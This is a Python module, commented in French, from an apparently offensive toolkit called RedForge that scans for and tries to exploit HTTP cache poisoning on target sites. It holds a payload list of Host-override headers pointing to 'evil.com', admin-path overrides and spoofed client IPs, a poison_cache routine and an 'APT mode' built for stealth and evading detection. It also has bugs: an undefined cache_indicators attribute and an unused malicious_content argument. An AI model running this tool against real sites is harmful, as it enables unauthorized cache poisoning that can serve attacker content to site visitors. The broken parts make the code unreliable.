#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'empoisonnement de cache pour RedForge
Détection des vulnérabilités d'empoisonnement de cache HTTP
Version avec support furtif, APT et techniques avancées
"""

import time
import random
import hashlib
import requests
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict

@dataclass
class CachePoisoningConfig:
    """Configuration avancée pour la détection d'empoisonnement de cache"""
    # Délais
    delay_between_requests: Tuple[float, float] = (1, 3)
    delay_between_tests: Tuple[float, float] = (2, 5)
    cache_wait_time: int = 2  # Temps d'attente pour la propagation du cache
    
    # Comportement
    max_poisoning_attempts: int = 10
    test_cdn_poisoning: bool = True
    test_header_poisoning: bool = True
    test_param_poisoning: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    slow_poisoning: bool = False  # Évite les pics de requêtes
    
    # Analyse avancée
    detect_cdn: bool = True
    detect_cache_key: bool = True
    test_vary_header: bool = True
    max_test_paths: int = 20


class CachePoisoning:
    """Détection et exploitation avancée de l'empoisonnement de cache"""
    
    def __init__(self, config: Optional[CachePoisoningConfig] = None):
        """
        Initialise le détecteur d'empoisonnement de cache
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or CachePoisoningConfig()
        
        # Headers de cache à surveiller
        self.cache_headers = [
            'X-Cache', 'Cache-Control', 'X-Varnish', 'X-Cache-Status',
            'X-Cache-Hits', 'X-Proxy-Cache', 'CF-Cache-Status', 'Age',
            'X-Squid-Error', 'X-Cache-Lookup', 'X-Nginx-Cache',
            'X-Cacheable', 'X-Forwarded-Cache', 'Via'
        ]
        
        # CDN signatures
        self.cdn_signatures = {
            'Cloudflare': ['CF-Cache-Status', 'cf-ray', '__cfduid'],
            'Akamai': ['X-Akamai-Transformed', 'X-Akamai-Request-ID'],
            'Fastly': ['X-Served-By', 'X-Cache-Hits', 'Fastly'],
            'CloudFront': ['X-Amz-Cf-Id', 'X-Amz-Cf-Pop'],
            'Varnish': ['X-Varnish', 'X-Cache', 'Via'],
            'Squid': ['X-Squid-Error', 'X-Cache-Lookup'],
            'Nginx': ['X-Proxy-Cache', 'X-Accel-Expires']
        }
        
        # Payloads d'empoisonnement avancés
        self.poisoning_payloads = self._generate_payloads()
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.cdn_detected = None
    
    def _generate_payloads(self) -> List[Dict[str, Any]]:
        """Génère une liste complète de payloads d'empoisonnement"""
        payloads = []
        
        # Header poisoning
        if self.config.test_header_poisoning:
            header_payloads = [
                # Host headers
                {'header': 'Host', 'value': 'evil.com', 'type': 'host'},
                {'header': 'X-Forwarded-Host', 'value': 'evil.com', 'type': 'host'},
                {'header': 'X-Host', 'value': 'evil.com', 'type': 'host'},
                {'header': 'X-Original-Host', 'value': 'evil.com', 'type': 'host'},
                {'header': 'X-Forwarded-Server', 'value': 'evil.com', 'type': 'host'},
                {'header': 'X-HTTP-Host-Override', 'value': 'evil.com', 'type': 'host'},
                # Cache control
                {'header': 'X-HTTP-Method-Override', 'value': 'GET', 'type': 'method'},
                {'header': 'X-Original-URL', 'value': '/admin', 'type': 'path'},
                {'header': 'X-Rewrite-URL', 'value': '/admin', 'type': 'path'},
                {'header': 'X-Override-URL', 'value': '/admin', 'type': 'path'},
                # Cache poisoning headers
                {'header': 'X-Cache-Poison', 'value': '1', 'type': 'poison'},
                {'header': 'X-Cache-Bypass', 'value': '1', 'type': 'bypass'},
                {'header': 'Pragma', 'value': 'no-cache', 'type': 'bypass'},
                {'header': 'Cache-Control', 'value': 'no-cache, no-store', 'type': 'bypass'},
                # Split cache
                {'header': 'Accept-Encoding', 'value': 'gzip, deflate, br', 'type': 'encoding'},
                {'header': 'Accept-Language', 'value': 'fr-FR,fr;q=0.9', 'type': 'language'},
                {'header': 'User-Agent', 'value': 'Mozilla/5.0 (evil)', 'type': 'ua'}
            ]
            payloads.extend(header_payloads)
        
        # Parameter poisoning
        if self.config.test_param_poisoning:
            param_payloads = [
                {'param': 'cb', 'value': '1', 'type': 'cache_buster'},
                {'param': '_', 'value': '1', 'type': 'cache_buster'},
                {'param': 'nocache', 'value': '1', 'type': 'bypass'},
                {'param': 'refresh', 'value': '1', 'type': 'bypass'},
                {'param': 'debug', 'value': '1', 'type': 'debug'},
                {'param': 'admin', 'value': '1', 'type': 'admin'},
                {'param': 'lang', 'value': 'fr', 'type': 'language'},
                {'param': 'device', 'value': 'mobile', 'type': 'device'}
            ]
            payloads.extend(param_payloads)
        
        # CDN-specific payloads
        if self.config.test_cdn_poisoning:
            cdn_payloads = [
                {'header': 'X-Forwarded-For', 'value': '127.0.0.1', 'type': 'cdn'},
                {'header': 'X-Real-IP', 'value': '127.0.0.1', 'type': 'cdn'},
                {'header': 'CF-Connecting-IP', 'value': '127.0.0.1', 'type': 'cloudflare'},
                {'header': 'True-Client-IP', 'value': '127.0.0.1', 'type': 'akamai'},
                {'header': 'X-Client-IP', 'value': '127.0.0.1', 'type': 'cdn'}
            ]
            payloads.extend(cdn_payloads)
        
        return payloads
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'empoisonnement de cache
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - test_paths: Chemins à tester
                - poison_headers: Headers à injecter
                - delay: Délai entre les tests
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test d'empoisonnement de cache sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        
        # Détection du cache et CDN
        cache_info = self._detect_cache(target)
        self.cdn_detected = cache_info.get('cdn')
        
        if cache_info['cached']:
            print(f"      ✓ Cache détecté: {cache_info['type']}")
            if cache_info.get('cdn'):
                print(f"      ✓ CDN identifié: {cache_info['cdn']}")
            
            # Analyser la clé de cache
            if self.config.detect_cache_key:
                cache_key_analysis = self._analyze_cache_key(target)
                if cache_key_analysis:
                    print(f"      ✓ Éléments de clé de cache: {cache_key_analysis}")
            
            # Tester les payloads d'empoisonnement
            paths_to_test = kwargs.get('test_paths', [target])
            
            for path in paths_to_test[:self.config.max_test_paths]:
                for payload in self.poisoning_payloads[:self.config.max_poisoning_attempts]:
                    if self.config.random_delays:
                        time.sleep(random.uniform(*self.config.delay_between_tests))
                    
                    result = self._test_poisoning(path, payload, cache_info)
                    self.tests_performed += 1
                    
                    if result['vulnerable']:
                        self.vulnerabilities_found += 1
                        vulnerabilities.append({
                            "type": "cache_poisoning",
                            "payload": payload,
                            "severity": "HIGH",
                            "details": result['details'],
                            "cache_duration": result.get('cache_duration'),
                            "cache_key_elements": result.get('cache_key_elements', []),
                            "risk_score": 85
                        })
                        print(f"      ✓ Empoisonnement possible: {payload.get('header', payload.get('param'))}")
                        
                        if self.config.apt_mode:
                            break  # Un seul suffit en mode APT
                
                if self.config.apt_mode and vulnerabilities:
                    break
        
        return self._generate_results(target, vulnerabilities, cache_info)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'max_poisoning_attempts' in kwargs:
            self.config.max_poisoning_attempts = kwargs['max_poisoning_attempts']
        if 'test_paths' in kwargs:
            self.config.max_test_paths = len(kwargs['test_paths'])
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.slow_poisoning = True
            self.config.max_poisoning_attempts = min(self.config.max_poisoning_attempts, 5)
            self.config.delay_between_tests = (5, 15)
            self.config.cache_wait_time = 5
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _detect_cache(self, target: str) -> Dict[str, Any]:
        """
        Détecte la présence d'un cache HTTP et CDN
        
        Args:
            target: URL cible
        """
        result = {
            "cached": False,
            "type": None,
            "cdn": None,
            "headers": {},
            "cache_duration": None,
            "cache_behavior": {}
        }
        
        try:
            # Générer une URL unique
            unique_param = f"_={int(time.time())}"
            test_url = self._add_cache_buster(target, unique_param)
            
            headers = self._get_stealth_headers()
            
            # Première requête (cache miss)
            response1 = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Deuxième requête (cache hit potentiel)
            time.sleep(self.config.cache_wait_time)
            response2 = requests.get(test_url, headers=headers, timeout=10, verify=False)
            
            # Analyser les headers
            for header in self.cache_headers:
                if header in response1.headers:
                    result["headers"][header] = response1.headers[header]
                    result["cached"] = True
            
            # Détection CDN
            for cdn_name, signatures in self.cdn_signatures.items():
                for sig in signatures:
                    if sig in response1.headers:
                        result["cdn"] = cdn_name
                        result["cached"] = True
                        break
                if result.get("cdn"):
                    break
            
            # Déterminer le type de cache
            if result.get("cdn"):
                result["type"] = result["cdn"]
            elif any(h in result["headers"] for h in ['X-Varnish', 'X-Cache']):
                result["type"] = "Varnish"
            elif 'X-Proxy-Cache' in result["headers"]:
                result["type"] = "Nginx"
            elif 'X-Squid-Error' in result["headers"]:
                result["type"] = "Squid"
            elif result["cached"]:
                result["type"] = "Generic"
            
            # Analyser le comportement du cache
            if response1.elapsed.total_seconds() > response2.elapsed.total_seconds() * 1.5:
                result["cache_behavior"]["speed_improvement"] = True
            
            # Cache-Control
            cache_control = response1.headers.get('Cache-Control', '')
            if 'max-age=' in cache_control:
                import re
                match = re.search(r'max-age=(\d+)', cache_control)
                if match:
                    result["cache_duration"] = int(match.group(1))
            
            # Age header
            age = response2.headers.get('Age', '0')
            if age.isdigit() and int(age) > 0:
                result["cache_behavior"]["age"] = int(age)
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _analyze_cache_key(self, target: str) -> List[str]:
        """
        Analyse les éléments qui composent la clé de cache
        
        Args:
            target: URL cible
        """
        cache_key_elements = []
        
        # Tester différents headers
        test_headers = [
            'User-Agent', 'Accept', 'Accept-Language', 'Accept-Encoding',
            'Host', 'Cookie', 'Authorization'
        ]
        
        base_response = None
        base_url = self._add_cache_buster(target, f"base_{int(time.time())}")
        
        try:
            headers = self._get_stealth_headers()
            base_response = requests.get(base_url, headers=headers, timeout=10, verify=False)
            
            for header in test_headers:
                test_headers_dict = self._get_stealth_headers({header: 'test_value_' + header})
                test_url = self._add_cache_buster(target, f"test_{header}_{int(time.time())}")
                
                time.sleep(self.config.cache_wait_time)
                test_response = requests.get(test_url, headers=test_headers_dict, timeout=10, verify=False)
                
                # Si le contenu diffère, le header fait partie de la clé
                if test_response.text != base_response.text:
                    cache_key_elements.append(f"header:{header}")
                    
        except Exception:
            pass
        
        return cache_key_elements
    
    def _test_poisoning(self, target: str, payload: Dict, 
                        cache_info: Dict) -> Dict[str, Any]:
        """
        Teste un payload d'empoisonnement de cache
        
        Args:
            target: URL cible
            payload: Payload à tester
            cache_info: Informations sur le cache
        """
        result = {
            "vulnerable": False,
            "details": None,
            "cache_duration": None,
            "cache_key_elements": []
        }
        
        # Générer une URL unique pour éviter les faux positifs
        poison_tag = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
        test_url = self._add_cache_buster(target, f"poison_{poison_tag}")
        
        try:
            # Construire les headers
            headers = self._get_stealth_headers()
            if 'header' in payload:
                headers[payload['header']] = payload['value']
            
            # Ajouter un paramètre si spécifié
            if 'param' in payload:
                parsed = urlparse(test_url)
                query_params = parse_qs(parsed.query)
                query_params[payload['param']] = [payload['value']]
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
            
            # Requête malveillante
            malicious_response = requests.get(test_url, headers=headers, timeout=10, verify=False)
            malicious_content = malicious_response.text
            malicious_hash = hashlib.md5(malicious_content.encode()).hexdigest()
            
            # Attendre la propagation du cache
            time.sleep(self.config.cache_wait_time)
            
            # Requête normale (sans le payload)
            normal_headers = self._get_stealth_headers()
            if 'header' in payload:
                # Retirer le header malveillant
                normal_headers.pop(payload['header'], None)
            
            normal_response = requests.get(test_url, headers=normal_headers, timeout=10, verify=False)
            normal_hash = hashlib.md5(normal_response.text.encode()).hexdigest()
            
            # Vérifier si le contenu malveillant est servi
            if malicious_hash == normal_hash and len(malicious_content) > 100:
                result["vulnerable"] = True
                result["details"] = f"Cache empoisonné via {payload.get('header', payload.get('param'))}"
                result["cache_key_elements"] = [payload.get('header', payload.get('param'))]
                
                # Vérifier la durée du cache
                age = normal_response.headers.get('Age', '0')
                if age.isdigit() and int(age) > 0:
                    result["cache_duration"] = int(age)
                    
        except Exception as e:
            pass
        
        return result
    
    def _add_cache_buster(self, url: str, value: str) -> str:
        """Ajoute un paramètre cache buster à l'URL"""
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        query_params['_cb'] = [value]
        new_query = urlencode(query_params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict],
                         cache_info: Dict) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "cache_detected": cache_info['cached'],
            "cache_info": cache_info,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "cdn_detected": self.cdn_detected is not None
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities, cache_info)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucun empoisonnement de cache détecté"}
        
        return {
            "total": len(vulnerabilities),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict], 
                                  cache_info: Dict) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        if vulnerabilities:
            recommendations.add("Ne pas utiliser les headers client dans la clé de cache")
            recommendations.add("Valider et normaliser les headers avant mise en cache")
            recommendations.add("Utiliser une clé de cache basée uniquement sur l'URL et le contenu")
        
        if cache_info.get('cdn'):
            recommendations.add(f"Configurer le CDN ({cache_info['cdn']}) pour ignorer les headers non sécurisés")
        
        if any(p.get('type') == 'host' for v in vulnerabilities for p in [v['payload']]):
            recommendations.add("Désactiver le virtual host routing basé sur les headers")
            recommendations.add("Valider le Host header contre une liste blanche")
        
        if any(p.get('type') == 'path' for v in vulnerabilities for p in [v['payload']]):
            recommendations.add("Ne pas accepter les headers X-Original-URL ou X-Rewrite-URL")
            recommendations.add("Implémenter un mapping URL sécurisé")
        
        recommendations.add("Utiliser des cache keys courtes et prévisibles")
        recommendations.add("Implémenter un mécanisme d'invalidation de cache")
        
        return list(recommendations)
    
    def poison_cache(self, target: str, malicious_content: str, 
                     headers: Dict = None, param: str = None) -> Dict[str, Any]:
        """
        Tente d'empoisonner le cache avec du contenu malveillant
        
        Args:
            target: URL cible
            malicious_content: Contenu à injecter dans le cache
            headers: Headers supplémentaires
            param: Paramètre à injecter
        """
        result = {
            "success": False,
            "poisoned": False,
            "url": target
        }
        
        if headers is None:
            headers = {}
        
        try:
            # Générer un identifiant unique
            poison_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]
            test_url = self._add_cache_buster(target, poison_id)
            
            # Ajouter un paramètre si spécifié
            if param:
                parsed = urlparse(test_url)
                query_params = parse_qs(parsed.query)
                query_params[param] = ['1']
                new_query = urlencode(query_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
            
            # Envoyer la requête malveillante avec un header spécial
            poison_headers = self._get_stealth_headers(headers)
            poison_headers['X-Cache-Poison-Test'] = poison_id
            
            response = requests.get(test_url, headers=poison_headers, timeout=10, verify=False)
            
            # Vérifier si le cache est empoisonné
            time.sleep(self.config.cache_wait_time)
            verify_headers = self._get_stealth_headers()
            verify_response = requests.get(test_url, headers=verify_headers, timeout=10, verify=False)
            
            if verify_response.status_code == response.status_code:
                result["success"] = True
                result["poisoned"] = True
                result["poison_id"] = poison_id
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_cache_buster(self, length: int = 16) -> str:
        """
        Génère un paramètre de contournement de cache
        
        Args:
            length: Longueur du cache buster
            
        Returns:
            Paramètre unique pour contourner le cache
        """
        import secrets
        import string
        
        random_str = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))
        timestamp = int(time.time() * 1000)
        
        return f"cb={random_str}_{timestamp}"
    
    def test_cache_behavior(self, target: str, iterations: int = 5) -> Dict[str, Any]:
        """
        Analyse le comportement du cache sur plusieurs requêtes
        
        Args:
            target: URL cible
            iterations: Nombre d'itérations
        """
        result = {
            "target": target,
            "cache_hits": 0,
            "cache_misses": 0,
            "response_times": [],
            "cache_headers": {}
        }
        
        for i in range(iterations):
            test_url = self._add_cache_buster(target, f"test_{i}_{int(time.time())}")
            
            try:
                headers = self._get_stealth_headers()
                start_time = time.time()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                response_time = time.time() - start_time
                
                result["response_times"].append(response_time)
                
                # Analyser les headers de cache
                for header in self.cache_headers:
                    if header in response.headers:
                        value = response.headers[header]
                        result["cache_headers"][header] = value
                        
                        if any(ind in value.lower() for ind in self.cache_indicators['hit']):
                            result["cache_hits"] += 1
                        elif any(ind in value.lower() for ind in self.cache_indicators['miss']):
                            result["cache_misses"] += 1
                
                time.sleep(self.config.cache_wait_time)
                
            except Exception:
                pass
        
        return result
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "cdn_detected": self.cdn_detected
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    cp = CachePoisoning()
    results = cp.scan("https://example.com")
    print(f"Cache poisoning possible: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = CachePoisoningConfig(apt_mode=True, slow_poisoning=True)
    cp_apt = CachePoisoning(config=apt_config)
    results_apt = cp_apt.scan("https://example.com", apt_mode=True)
    print(f"Cache poisoning (APT): {results_apt['count']}")
    
    # Analyser le comportement du cache
    cache_behavior = cp_apt.test_cache_behavior("https://example.com")
    print(f"\nCache hits: {cache_behavior['cache_hits']}")
    print(f"Cache misses: {cache_behavior['cache_misses']}")
    
    # Générer un cache buster
    cache_buster = cp_apt.generate_cache_buster()
    print(f"Cache buster généré: {cache_buster}")